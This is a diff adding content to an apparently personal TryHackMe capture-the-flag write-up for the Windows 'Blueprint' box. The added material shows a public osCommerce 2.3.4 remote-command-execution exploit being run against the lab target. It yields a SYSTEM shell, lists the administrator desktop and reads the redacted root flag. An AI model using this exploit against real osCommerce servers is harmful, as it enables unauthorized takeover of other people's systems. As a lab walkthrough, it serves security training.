@@ -2,7 +2,7 @@
 title: "TryHackMe - Windows - Easy - Blueprint"
 date: 2025-11-11 12:00:00 -0000
 categories: [CTF, TryHackMe]
-tags: [windows,easy]
+tags: [windows, easy, web discovery, RCE]
 ---
 
 ![TryHackMe Blueprint](/assets/img/ctf/thm/easy/blueprint/blueprint.png))
@@ -13,6 +13,8 @@ tags: [windows,easy]
 
 # tl;dr
 <details><summary>Spoilers</summary>
+* Enumerate the webserver on :8080
+* Find an exploit for the exact app version for RCE as SYSTEM
 </details>
 
 # Attack Path
@@ -109,13 +111,48 @@ http://10.201.75.197:8080/oscommerce-2.3.4/catalog/login.php
 
 ![osCommerce 2.3.4 Exploit](/assets/img/ctf/thm/easy/blueprint/1.png)
 
-
-
 ## Foothold
+
+Now that I'd enumerated a potential attack vector, I found a different exploit on Github:
+
+[osCommerce RCE exploit](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution)
+
+I launched the expoit and immediately got RCE as NT Authrotity/SYSTEM:
+
+```powershell
+┌──(haunter㉿kali)-[~/working/thm/easy/blueprint/osCommerce-2.3.4-Remote-Command-Execution]
+└─$ python3 osCommerce2_3_4RCE.py http://blueprint:8080/oscommerce-2.3.4/catalog
+[*] Install directory still available, the host likely vulnerable to the exploit.
+[*] Testing injecting system command to test vulnerability
+User: nt authority\system                             
+
+RCE_SHELL$ dir c:\users\administrator\desktop            
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of c:\users\administrator\desktop
+
+11/27/2019  06:15 PM    <DIR>          .
+11/27/2019  06:15 PM    <DIR>          ..
+11/27/2019  06:15 PM                37 root.txt.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  19,481,919,488 bytes free
+```
 
 ## Lateral Movement / Privilege Escalation
 
+N/A. Could choose to get a better shell here, but it's not needed.
+
 ## Root / SYSTEM
 
-# Lessons Learned
+```powershell
+RCE_SHELL$ type c:\users\administrator\desktop\root.txt.txt
+THM{REDACTED}
+```
 
+![root.txt flag](/assets/img/ctf/thm/easy/blueprint/root.png)
+
+Got the root flag.
+
+# Lessons Learned
+N/A
